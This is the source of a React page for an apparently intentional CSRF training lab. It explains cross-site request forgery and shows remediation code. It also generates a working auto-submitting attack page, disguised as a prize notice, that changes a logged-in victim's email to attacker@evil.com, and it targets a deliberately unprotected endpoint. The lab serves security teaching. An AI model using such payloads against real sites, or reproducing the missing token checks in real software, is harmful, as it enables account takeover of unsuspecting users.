import React, { useState } from 'react';
import axios from 'axios';
import './LabPage.css';

const API_BASE = process.env.REACT_APP_API_BASE || 'http://localhost:3001';

// PUBLIC_INTERFACE
/**
 * Level 7: CSRF (Cross-Site Request Forgery) Lab
 * OWASP A01:2021 - Broken Access Control
 * 
 * Demonstrates CSRF vulnerability where state-changing operations
 * lack CSRF token validation, allowing unauthorized actions.
 */
function CSRFLab() {
  const [newEmail, setNewEmail] = useState('');
  const [response, setResponse] = useState(null);
  const [maliciousHtml, setMaliciousHtml] = useState('');

  const handleChangeEmail = async (e) => {
    e.preventDefault();
    
    try {
      const token = sessionStorage.getItem('token');
      const result = await axios.post(
        `${API_BASE}/api/vulnerable/change-email`,
        { newEmail },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      
      setResponse(result.data);
    } catch (err) {
      setResponse({ status: 'error', message: err.response?.data?.message || err.message });
    }
  };

  const generateMaliciousPage = () => {
    const html = `<!DOCTYPE html>
<html>
<head>
  <title>You Won a Prize!</title>
</head>
<body>
  <h1>Congratulations! Click to claim your prize!</h1>
  
  <!-- CSRF Attack: This form auto-submits when page loads -->
  <form id="csrf-form" action="${API_BASE}/api/vulnerable/change-email" method="POST">
    <input type="hidden" name="newEmail" value="attacker@evil.com" />
  </form>
  
  <script>
    // Auto-submit the form when victim visits this page
    // If victim is logged in, their email will be changed!
    document.getElementById('csrf-form').submit();
  </script>
  
  <p>Loading your prize...</p>
</body>
</html>`;
    
    setMaliciousHtml(html);
  };

  return (
    <div className="lab-page">
      <div className="lab-header">
        <h1>🎯 Level 7: CSRF Attack</h1>
        <span className="lab-badge difficulty-medium">Medium</span>
        <span className="lab-badge">OWASP A01</span>
      </div>

      <div className="lab-section">
        <h2>📝 Objective</h2>
        <p>
          Perform unauthorized actions on behalf of an authenticated user by exploiting
          missing CSRF protections. Create a malicious page that changes a victim's email
          when they visit it while logged in.
        </p>
      </div>

      <div className="lab-section vulnerability-warning">
        <h3>⚠️ Vulnerability Details</h3>
        <ul>
          <li><strong>Type:</strong> Cross-Site Request Forgery (CSRF)</li>
          <li><strong>Impact:</strong> Unauthorized actions, account takeover</li>
          <li><strong>Root Cause:</strong> No CSRF token validation</li>
          <li><strong>Attack Method:</strong> Trick victim into submitting malicious request</li>
          <li><strong>OWASP:</strong> A01:2021 - Broken Access Control</li>
        </ul>
      </div>

      <div className="lab-interactive">
        <h2>📧 Change Email (Vulnerable Endpoint)</h2>
        
        <form onSubmit={handleChangeEmail} className="comment-form">
          <div className="form-group">
            <label>New Email Address:</label>
            <input
              type="email"
              value={newEmail}
              onChange={(e) => setNewEmail(e.target.value)}
              placeholder="newemail@example.com"
              required
            />
          </div>
          
          <button type="submit" className="btn-primary">Change Email</button>
        </form>

        {response && (
          <div className={`message ${response.status === 'error' ? 'error' : 'success'}`}
               style={{
                 background: response.status === 'error' ? '#fee2e2' : '#d1fae5',
                 border: response.status === 'error' ? '1px solid #ef4444' : '1px solid #10b981'
               }}>
            <pre style={{whiteSpace: 'pre-wrap'}}>
              {JSON.stringify(response, null, 2)}
            </pre>
          </div>
        )}
      </div>

      <div className="lab-section">
        <h2>🎭 Create Malicious CSRF Page</h2>
        <button onClick={generateMaliciousPage} className="btn-primary">
          Generate Attack HTML
        </button>

        {maliciousHtml && (
          <div style={{marginTop: '15px'}}>
            <h3>Malicious HTML (Save as .html and host on attacker site):</h3>
            <textarea
              value={maliciousHtml}
              readOnly
              rows="20"
              style={{
                width: '100%',
                fontFamily: 'monospace',
                fontSize: '12px',
                padding: '10px',
                background: '#1f2937',
                color: '#10b981',
                borderRadius: '6px'
              }}
            />
            <p style={{marginTop: '10px', color: '#6b7280'}}>
              💡 <strong>Attack Scenario:</strong> Host this HTML on an attacker-controlled domain.
              When a logged-in victim visits this page, the form auto-submits and changes their email!
            </p>
          </div>
        )}
      </div>

      <div className="lab-section">
        <h2>🔍 How CSRF Works</h2>
        <ol>
          <li><strong>Victim logs in</strong> to the vulnerable application</li>
          <li><strong>Browser stores session</strong> (cookie, token in localStorage, etc.)</li>
          <li><strong>Attacker tricks victim</strong> into visiting malicious page (phishing email)</li>
          <li><strong>Malicious page submits request</strong> to vulnerable endpoint</li>
          <li><strong>Browser automatically includes</strong> authentication credentials</li>
          <li><strong>Server processes request</strong> as if victim intended it</li>
          <li><strong>Action completed</strong> without victim's knowledge or consent</li>
        </ol>
      </div>

      <div className="lab-section">
        <h2>🛡️ Remediation</h2>
        <pre className="code-block">
{`// Bad (Vulnerable):
router.post('/change-email', requireAuth, async (req, res) => {
  // No CSRF token check!
  await User.updateOne({ _id: req.user._id }, { email: req.body.newEmail });
  return res.json({ success: true });
});

// Good (Secure):
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

router.post('/change-email', requireAuth, csrfProtection, async (req, res) => {
  // CSRF token automatically validated by middleware
  await User.updateOne({ _id: req.user._id }, { email: req.body.newEmail });
  return res.json({ success: true });
});

// Frontend must include CSRF token:
<form>
  <input type="hidden" name="_csrf" value="{csrfToken}" />
  <!-- other fields -->
</form>

// Additional protections:
// 1. SameSite cookie attribute
res.cookie('session', token, { 
  sameSite: 'strict',  // or 'lax'
  httpOnly: true,
  secure: true 
});

// 2. Verify Origin/Referer headers
if (req.get('origin') !== 'https://trusted-domain.com') {
  return res.status(403).json({ error: 'Invalid origin' });
}

// 3. Require re-authentication for sensitive actions
// 4. Use POST for state-changing operations (never GET)
// 5. Double-submit cookie pattern
// 6. Custom request headers (AJAX only)`}
        </pre>
      </div>

      <div className="lab-hint">
        💡 <strong>Hint:</strong> The /api/vulnerable/change-email endpoint has no CSRF token validation.
        Any POST request with a valid Bearer token will succeed!
      </div>
    </div>
  );
}

export default CSRFLab;
